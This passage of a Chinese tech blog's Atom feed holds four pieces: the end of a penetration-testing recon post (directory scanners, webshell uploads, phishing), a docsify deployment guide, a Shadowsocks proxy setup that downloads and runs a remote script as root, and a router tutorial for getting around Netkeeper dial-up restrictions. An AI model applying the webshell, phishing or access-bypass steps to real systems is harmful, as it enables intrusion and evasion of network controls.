title="目录扫描"></a>目录扫描</h2><p>网站目录和敏感文件扫描是网站测试中最基本的手段之一。如果通过该方法发现了网站后台，可以尝试暴库、SQL注入等方式进行安全测试；如果发现敏感目录或敏感文件，能帮我们获取如php环境变量、robots.txt、网站指纹等信息；如果扫描出了一些上传的文件，我们甚至可能通过上传功能（一句话恶意代码）获取网站的权限。</p><ul><li>目录扫描原理：通过请求返回的信息来判断当前目录或文件是否真实存在。网站后台扫描工具都是利用目录字典进行爆破扫描，字典越多，扫描到的结果也越多。</li><li>工具：<ul><li>dirsearch：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li><li>yjdirscan（御剑目录扫描专业版）：<a href="https://github.com/foryujian/yjdirscan">https://github.com/foryujian/yjdirscan</a></li><li>7kbscan-WebPathBrute：<a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></li><li>Dirmap：<a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></li><li>DirBuster：Kali Linux提供的目录扫描工具</li><li>webdirscan：<a href="https://github.com/TuuuNya/webdirscan">https://github.com/TuuuNya/webdirscan</a></li></ul></li></ul><h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><ul><li>社工库</li><li>邮件钓鱼</li><li>客服</li><li>构造字典</li><li>…..</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;在平常的渗透测试的过程中，最重要也是最首要的一步就是信息收集，在这个阶段我们要尽可能的收集目标组织的信息，所谓“知</summary>
      
    
    
    
    <category term="Web安全" scheme="https://kb-at-zero.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="信息收集" scheme="https://kb-at-zero.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="渗透测试" scheme="https://kb-at-zero.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>docsify部署知识库</title>
    <link href="https://kb-at-zero.github.io/2020/10/23/docsify%E9%83%A8%E7%BD%B2%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    <id>https://kb-at-zero.github.io/2020/10/23/docsify%E9%83%A8%E7%BD%B2%E7%9F%A5%E8%AF%86%E5%BA%93/</id>
    <published>2020-10-23T14:29:08.000Z</published>
    <updated>2021-04-20T14:52:51.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ul><li>nodejs&nbsp;&nbsp;&nbsp;</li><li>Ubuntu 16.04</li><li>docsify</li><li>Nginx</li></ul><h2 id="0x02-搭建nodejs"><a href="#0x02-搭建nodejs" class="headerlink" title="0x02 搭建nodejs"></a>0x02 搭建nodejs</h2><ul><li>安装nodejs</li><li><a href="https://npm.taobao.org/mirrors/node/v10.15.0/">https://npm.taobao.org/mirrors/node/v10.15.0/</a> ,下载对应版本的nodejs（这里下载10.15）<br><img src="/images/pasted-4.png" alt="upload successful"></li></ul><ul><li>解压：tar -zxvf node-v10.15.0-linux-x64.tar.gz</li><li>修改名字：mv node-v10.15.0-linux-x64 nodejs</li><li>移动到/usr/local目录下（这个自己能找到就行）：mv nodejs /usr/local</li><li>建立全局软连:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;bin&#x2F;node &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node</span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;bin&#x2F;npm &#x2F;usr&#x2F;local&#x2F;bin&#x2F;npm</span><br></pre></td></tr></table></figure><img src="/images/pasted-5.png" alt="upload successful"></li></ul><h2 id="0x03-安装docsify"><a href="#0x03-安装docsify" class="headerlink" title="0x03 安装docsify"></a>0x03 安装docsify</h2><ul><li><p>npm全局安装：npm i docsify-cli -g</p></li><li><p>若安装完执行docsify找不到命令，那就建立一个软连接:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;nodejs&#x2F;bin&#x2F;docsify &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docsify</span><br></pre></td></tr></table></figure></li><li><p>docsify命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始化：docsify init .&#x2F;docs</span><br><span class="line">本地预览：docsify serve docs</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-6.png" alt="upload successful"><br><img src="/images/pasted-7.png" alt="upload successful"></p></li><li><p>更多详情请参考官方文档：<a href="https://docsify.js.org/#/zh-cn/quickstart">https://docsify.js.org/#/zh-cn/quickstart</a></p></li></ul><h2 id="0x04-配置访问权限"><a href="#0x04-配置访问权限" class="headerlink" title="0x04 配置访问权限"></a>0x04 配置访问权限</h2><ul><li><p>Nginx配置反向代理和Basic Authentication 401认证</p><ul><li><p>编辑nginx的配置文件/etc/nginx/nginx.conf如下：<br><img src="/images/pasted-8.png" alt="upload successful"></p></li><li><p>生成密码文件&nbsp;sudo htpasswd -c /etc/nginx/conf/htpasswd username&nbsp;根据提示输入密码&nbsp;</p></li></ul></li><li><p>重新加载nginx：&nbsp;sudo service nginx reload</p></li><li><p>  再次登录，提示弹出框，输入用户名和密码<br><img src="/images/pasted-9.png" alt="upload successful"></p></li></ul><h2 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h2><ul><li><p>pandoc批量将docx文件转markdown文件</p><ul><li>官方链接：<a href="https://www.pandoc.org/">https://www.pandoc.org</a>，pandoc是文档格式转化工具，能够多种文档格式转换。</li><li>  命令格式：pandoc -o f.md f.docx -extract-media=f</li><li>批量递归替换文件名和文件夹名中的空格或者特殊字符：<br><img src="/images/pasted-10.png" alt="upload successful"><br>批量替换空格或者其他特殊字符<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line">chcp 65001</span><br><span class="line"></span><br><span class="line">:: 如果要指定绝对路径，用以下两行，注释 set path&#x3D;. 所在行。也就是用以下两行代替 set path&#x3D;. 这一行。</span><br><span class="line">:: set path&#x3D;&quot;C:\temp\test&quot;</span><br><span class="line">:: cd &quot;&#x2F;d %path%&quot;</span><br><span class="line"></span><br><span class="line">set path&#x3D;.</span><br><span class="line">:: echo.&amp;set &#x2F;p path&#x3D;please input path:</span><br><span class="line"></span><br><span class="line">set str_space&#x3D; </span><br><span class="line">set str_heng&#x3D;-</span><br><span class="line"></span><br><span class="line">:: 删除特殊字符，记得替换成你自己需要删除的</span><br><span class="line">set adv&#x3D; </span><br><span class="line">:: echo.&amp;set &#x2F;p adv&#x3D;please input to be delete characters:</span><br><span class="line"></span><br><span class="line">call:renameFiles</span><br><span class="line"></span><br><span class="line">for &#x2F;f &quot;delims&#x3D;&quot; %%i in (&#39;dir &#x2F;ad&#x2F;b&#x2F;s &quot;%path%&quot;&#39;) do (</span><br><span class="line">       cd %%i</span><br><span class="line">       call:renameFiles</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line">echo 处理完毕</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line">:: 子过程一般放在最后，主程序最后要加上exit或跳转语句，避免错误的进入子过程。</span><br><span class="line">:: 如果没有 exit，子程序还会被执行（而不是调用）一次，这样在执行 echo %1 时，因为没有参数，会提示：ECHO is off.</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">:renameFiles</span><br><span class="line">echo 正在处理的目录：【%cd%】 ...</span><br><span class="line"></span><br><span class="line">:: 先删除空格</span><br><span class="line">for &#x2F;f &quot;delims&#x3D;&quot; %%i in (&#39;dir &#x2F;b *.*&#39;) do (</span><br><span class="line">    set &quot;foo&#x3D;%%i&quot;</span><br><span class="line">    ren &quot;%%~i&quot; &quot;!foo:%str_space%&#x3D;%str_heng%!&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">for &#x2F;f &quot;delims&#x3D;&quot; %%i in (&#39;dir &#x2F;b *%adv%*&#39;) do (</span><br><span class="line">    :: echo %%i</span><br><span class="line">    set var&#x3D;%%i</span><br><span class="line">    set var&#x3D;!var:%adv%&#x3D;!</span><br><span class="line">    echo rename &quot;%%i&quot; to &quot;!var!&quot;</span><br><span class="line">    ren &quot;%%i&quot; &quot;!var!&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line">goto:eof</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>  批量将当前目录中的docx文档转换为markdown格式：<br><img src="/images/pasted-11.png" alt="upload successful"></li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 当前目录下所有文件的名字</span><br><span class="line">all_files_name &#x3D; os.listdir()</span><br><span class="line"></span><br><span class="line"># 保存所有docx文件的名字</span><br><span class="line">all_docx_files &#x3D; []</span><br><span class="line"></span><br><span class="line"># 获取目录下的docx文件, 并保存</span><br><span class="line">for file_name in all_files_name:</span><br><span class="line">    try:</span><br><span class="line">        if file_name[-5:] &#x3D;&#x3D; &quot;.docx&quot;:</span><br><span class="line">            all_docx_files.append(file_name)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line"># 将docx文件批量装换为md</span><br><span class="line">for docx_file in all_docx_files:</span><br><span class="line">    try:</span><br><span class="line">        tmp_md_name &#x3D; docx_file[0: -5] + &quot;.md&quot;</span><br><span class="line">        new_command &#x3D; &quot;pandoc &quot;+ docx_file + &quot; -o &quot; + tmp_md_name + &quot; --extract-media&#x3D;&quot; + docx_file[0: -5]</span><br><span class="line">        result &#x3D; os.popen(new_command).readlines()</span><br><span class="line">        if len(result) &#x3D;&#x3D; 0:</span><br><span class="line">            print(docx_file, &quot;转换成功&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure></li><li><p>批量生成docsify目录md文档</p><ul><li>插件地址：<a href="https://github.com/julianxhokaxhiu/gitbook-plugin-summary">https://github.com/julianxhokaxhiu/gitbook-plugin-summary</a></li><li>  安装：npm i gitbook-plugin-summary</li><li>  即可使用命令：book sm生成SUMMARY.md</li><li>  可将SUMMARY.md的内容复制到docsify目录下的_navbar.md文件中，即可批量生成目录。（注意：路径中不要有空格和[]&amp;等特殊字符）</li></ul></li></ul><h2 id="0x06-FAQ"><a href="#0x06-FAQ" class="headerlink" title="0x06 FAQ"></a>0x06 FAQ</h2><ul><li>docsify中有许多好用的小插件，可以选择性的加载。<br><img src="/images/pasted-12.png" alt="upload successful"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-环境&quot;&gt;&lt;a href=&quot;#0x01-环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 环境&quot;&gt;&lt;/a&gt;0x01 环境&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;nodejs&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Ubuntu 16.</summary>
      
    
    
    
    <category term="Wiki" scheme="https://kb-at-zero.github.io/categories/Wiki/"/>
    
    
    <category term="知识库" scheme="https://kb-at-zero.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>阿里云香港服务器搭建ssr科学上网</title>
    <link href="https://kb-at-zero.github.io/2019/04/14/%E9%98%BF%E9%87%8C%E4%BA%91%E9%A6%99%E6%B8%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAssr%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    <id>https://kb-at-zero.github.io/2019/04/14/%E9%98%BF%E9%87%8C%E4%BA%91%E9%A6%99%E6%B8%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAssr%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</id>
    <published>2019-04-14T13:59:13.000Z</published>
    <updated>2021-04-20T14:21:42.930Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">环境：阿里云香港ECS</span><br><span class="line">配置：cpu 1核心、内存 0.5GB、出网带宽 1Mbps</span><br><span class="line">系统：centos7.5</span><br></pre></td></tr></table></figure><h2 id="shadowsocks简介"><a href="#shadowsocks简介" class="headerlink" title="shadowsocks简介"></a>shadowsocks简介</h2><p><strong>shadowsocks</strong>是一种基于Socks5代理方式的网络数据加密传输包，并采用Apache许可证、GPL、MIT许可证等多种自由软件许可协议开放源代码。shadowsocks分为服务器端和客户端，在使用之前，需要先将服务器端部署到服务器上面，然后通过客户端连接并创建本地代理。目前包使用Python、C、C++、C#、Go语言等编程语言开发。</p><p>运行原理：Shadowsocks的运行原理与其他代理工具基本相同，使用特定的中转服务器完成数据传输。在服务器端部署完成后，用户需要按照指定的密码、加密方式和端口使用客户端软件与其连接。在成功连接到服务器后，客户端会在用户的电脑上构建一个本地Socks5代理。浏览网络时，网络流量会被分到本地socks5代理，客户端将其加密之后发送到服务器，服务器以同样的加密方式将流量回传给客户端，以此实现代理上网。</p><h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><p><strong>1、使用root用户，分别执行以下3条命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate -O shadowsocks-all.sh https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;teddysun&#x2F;shadowsocks_install&#x2F;master&#x2F;shadowsocks-all.sh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x shadowsocks-all.sh　</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;shadowsocks-all.sh 2&gt;&amp;1 &#39; tee shadowsocks-all.log</span><br></pre></td></tr></table></figure><p>执行后，会提示输入源码语言，密码、端口、及加密方式等。（笔者这里端口使用8989；源码选择的是python语言；加密方式我这里选择aes-256-cfb；）</p><p>最终会显示以下效果，说明部署已完成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Congratulations, your_shadowsocks_version install completed!  </span><br><span class="line"></span><br><span class="line">Your Server IP        :11.11.11.11  </span><br><span class="line"></span><br><span class="line">Your Server Port      :8989  </span><br><span class="line"></span><br><span class="line">Your Password         :123456  </span><br><span class="line"></span><br><span class="line">Your Encryption Method:aes-256-cfb</span><br><span class="line"></span><br><span class="line">Welcome to visit:https:&#x2F;&#x2F;teddysun.com&#x2F;486.html  </span><br><span class="line"> Enjoy it</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、<strong>把8989端口设置为开放状态</strong></p><p>打开防火墙配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim &#x2F;etc&#x2F;sysconfig&#x2F;iptables</span><br></pre></td></tr></table></figure><p>插入下面这句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 8989 -j ACCEPT</span><br></pre></td></tr></table></figure><p>保存后使更改生效，执行以下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service iptables save  </span><br></pre></td></tr></table></figure><p>3、<strong>开放云服务器端口（如果是阿里云服务器请继续看）</strong></p><p>阿里云有安全组配置，需要进入阿里云管理界面找到安全组配置，把8989端口开放。否则外网依然无法方位该端口。</p><p>至此，服务器部署完成！</p><p>3、<strong>卸载方法：使用root用户，执行以下命令即可</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;shadowsocks-all.sh uninstall</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="windows客户端"><a href="#windows客户端" class="headerlink" title="windows客户端"></a><strong>windows客户端</strong></h3><p>首先搜索shadowsocks-windows，打开后进行如下配置。</p><p>服务器地址：云服务器ip、端口：之前配置的端口、加密方式要选择服务器选择的加密方式、本级代理端口1080（可以改成别的）。<br><img src="/images/pasted-2.png" alt="upload successful"></p><p>配置好后，在电脑右下角找到ss，并点击启用。</p><p><img src="/images/pasted-3.png" alt="upload successful"></p><h3 id="iphone代理配置"><a href="#iphone代理配置" class="headerlink" title="iphone代理配置"></a>iphone代理配置</h3><p><strong>a.下载：</strong></p><p>APP Store中下载<strong>shadowrocket（</strong>需美国id付费<strong>）。</strong></p><p><strong>b.使用：</strong></p><p>打开App后， 点击右上角 + 号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">type：ss  </span><br><span class="line"></span><br><span class="line">name : 随便起一个名字即可。笔者是：abcd  </span><br><span class="line"></span><br><span class="line">server : 云服务器ip  </span><br><span class="line"></span><br><span class="line">port : 刚才配置的ip。笔者是：8989  </span><br><span class="line"></span><br><span class="line">password ： 你服务器设置的密码  </span><br><span class="line"></span><br><span class="line">proxyMethod：system  </span><br><span class="line"></span><br><span class="line">method ： 刚才配置的加密方式。笔者是：AES-256-CFB</span><br></pre></td></tr></table></figure><p>点击”save configuration”后进入choos页面，点击你刚刚创建的那个名字abcd即可。回到首页，找到你创建的代理并打开。</p><p>配置成功！经测试google、YouTube等网站打开很快，1080p视频毫无压力。</p><h3 id="ubuntu系统代理配置"><a href="#ubuntu系统代理配置" class="headerlink" title="ubuntu系统代理配置"></a>ubuntu系统代理配置</h3><p><strong>a.安装shadowsocks</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install shadowsocks</span><br></pre></td></tr></table></figure><p><strong>b.找到config.json，并编辑代理配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;etc&#x2F;shadowsocks&#x2F;</span><br><span class="line">$ sudo vim config.json</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;:&quot;x.x.x.x&quot;,    &#x2F;&#x2F;ss服务器的ip</span><br><span class="line">    &quot;server_port&quot;:8989, &#x2F;&#x2F;ss服务器的端口，笔者这里配置的是8989</span><br><span class="line">     &quot;local_address&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;:1080,  &#x2F;&#x2F;本机端口：可以换成别的</span><br><span class="line">    &quot;password&quot;:&quot;123456&quot;, &#x2F;&#x2F;ss服务器密码</span><br><span class="line">    &quot;timeout&quot;:300,</span><br><span class="line">    &quot;method&quot;:&quot;aes-256-cfb&quot; &#x2F;&#x2F;ss服务器配置的加密方式</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>c.启动shadowsocks，启动后控制台不要关闭</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sslocal -c config.json</span><br></pre></td></tr></table></figure><p><strong>d.配置代理。</strong></p><p>右上角-系统设置-网络-网络代理-手动。</p><p>Socks主机：127.0.0.1 &nbsp; &nbsp;端口：1080</p><p>最后点击”应用到整个系统”，至此，配置完成。</p><p><strong>e.让终端也走代理的方法:</strong></p><p>在~/.bashrc文件中增加以下两句，表示bash终端中的http和https的请求也通过socks5协议进行代理转发。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy&#x3D;&quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;</span><br><span class="line">export https_proxy&#x3D;&quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure><p>注：本次教程借鉴于<a href="https://www.cnblogs.com/tianhei/p/7428622.html">https://www.cnblogs.com/tianhei/p/7428622.html</a>　，本教程只用于学习使用，切勿用于商业和非法用途，此站点不承担任何法律责任。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr</summary>
      
    
    
    
    <category term="科学上网" scheme="https://kb-at-zero.github.io/categories/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    
    
    <category term="ssr科学上网" scheme="https://kb-at-zero.github.io/tags/ssr%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    
    <category term="shadowsocks" scheme="https://kb-at-zero.github.io/tags/shadowsocks/"/>
    
  </entry>
  
  <entry>
    <title>路由破解-netkeeper拨号</title>
    <link href="https://kb-at-zero.github.io/2018/09/01/%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3-netkeeper%E6%8B%A8%E5%8F%B7/"/>
    <id>https://kb-at-zero.github.io/2018/09/01/%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3-netkeeper%E6%8B%A8%E5%8F%B7/</id>
    <published>2018-09-01T06:04:00.000Z</published>
    <updated>2021-04-20T13:15:14.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="斐讯k2拨号开无线"><a href="#斐讯k2拨号开无线" class="headerlink" title="斐讯k2拨号开无线"></a>斐讯k2拨号开无线</h1><ul><li><p>1、刷breed 详细教程见文件<a href="https://github.com/kb-at-zero/netkeeper-breed/releases/download/1.0/K2.breed.doc">斐讯K2刷breed教程</a>。</p></li><li><p>2、k2拔掉电源后长按复位键不松手并插上电源线等待连续多个白灯同时迅速闪烁几次后再松手。</p></li><li><p>3、必须用网线连接电脑和路由器，浏览器输入192.168.1.1，进入breed界面。</p></li><li><p>4、依次点击：固件更新，勾选固件选项好自动重启，点击选择文件，选择固件，点击开始刷新并确认。</p></li><li><p>5、等待刷机完成后路由自动重启。</p></li><li><p>6、重启完成后浏览器输入192.168.1.1进入固件设置界面，登录默认用户名root，密码admin，登录以后将浏览器最小化等待后续使用。</p></li><li><p>7、打开winscp.exe，File protocol选择SCP，Host name输入192.168.1.1，User name输入root，Password输入admin，点击Login登录，出现Warning提示窗口点击Update即可进入。</p></li><li><p>8、此时界面左边文件栏是本地的，右边是路由器的，左边定位到教程和相关文件所在文件夹，右边多次点击..返回根目录，依次点击路径usr-lib-pppd-2.4.7，将左边栏目里shandongmobile_sxplugin.so拖动到右边并右击选择Properties（属性），出来的界面中将输入框里面默认的0644改成0755并确定保存。</p></li><li><p>9、右边多次点击..返回路由器根目录，双击打开tmp文件夹，左边右击confnetwork.sh选择Edit，在出来的界面将账号，密码填写完并保存，然后将此文件拖动到右边tmp文件夹内。</p></li><li><p>10、打开指令.txt，找到winscp界面靠近左上角一个黑色命令行按钮，点击打开，将指令.txt里面的上下两个指令（chmod a+x /tmp/confnetwork.sh&nbsp;&nbsp;&nbsp;&nbsp; sh /tmp/confnetwork.sh）依次复制粘贴到输入框里面并点击Execute，每输入一个指令都点击一下Execute，两个指令顺序千万不能反，第二指令如果弹窗出现任何信息都重新点击Execute操作，第二指令正常操作应该是光标变成沙漏样式好几秒以后恢复正常。</p></li><li><p>11、打开步骤6的浏览器，点击左边栏目系统-重启，点击执行重启，路由器重启完成会重新出现设置界面登录的信息，登录以后点击系统-系统，点击两次蓝色方框的同步浏览器时间按钮，每次都是等待时间变化后再点击一次等待显示时间和电脑时间相同时再立即插上网线，此时就可以正常上网了。</p></li><li><p>12、每次给路由器断电后必须拔掉网线，然后再通电开机，手机或电脑连接路由后登录设置界面并点击系统-系统，点击同步浏览器时间，然后立即插上网线开始上网。</p></li></ul><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h1><p><strong>1、网线直到教程结束前都不要插上路由器，否则完全无法成功且必须重新操作一遍教程步骤。</strong></p><p><strong>2、一旦路由出现任何问题无法上网时必须将教程除了刷breed以外再次完整操作一遍，否则无法上网</strong>。</p><p><strong>3、breed中备份固件功能请勿使用，备份出来的netkeeper网配置好的固件刷进去依旧会造成无法拨号上网的情况并需要重新将教程操作一遍</strong>。</p><p><strong>4、如果步骤7提示被拒绝，就浏览器输入192.168.1.1登录设置界面，点击系统-管理权，设置新密码然后再回到winscp改成对应密码再登录。</strong></p><p><strong>5、步骤11点击两次同步时间是点一次就连网线有小几率会出现后续配置完全失败得重新操作的情况。</strong></p><p><strong>特别注意：本文章只供学习用途。</strong></p><p>附上全部教程与文件（<a href="https://github.com/kb-at-zero/netkeeper-breed/releases/download/1.0/default1.zip">第一部分</a>&nbsp; <a href="https://github.com/kb-at-zero/netkeeper-breed/releases/download/1.0/default2.zip">第二部分</a>）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;斐讯k2拨号开无线&quot;&gt;&lt;a href=&quot;#斐讯k2拨号开无线&quot; class=&quot;headerlink&quot; title=&quot;斐讯k2拨号开无线&quot;&gt;&lt;/a&gt;斐讯k2拨号开无线&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;1、刷breed 详细教程见文件&lt;a href=&quot;https://</summary>
      
    
    
    
    <category term="路由器" scheme="https://kb-at-zero.github.io/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
    <category term="无线WIFI" scheme="https://kb-at-zero.github.io/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/%E6%97%A0%E7%BA%BFWIFI/"/>
    
    
    <category term="netkeeper" scheme="https://kb-at-zero.github.io/tags/netkeeper/"/>
    
    <category term="无线破解" scheme="https://kb-at-zero.github.io/tags/%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
</feed>
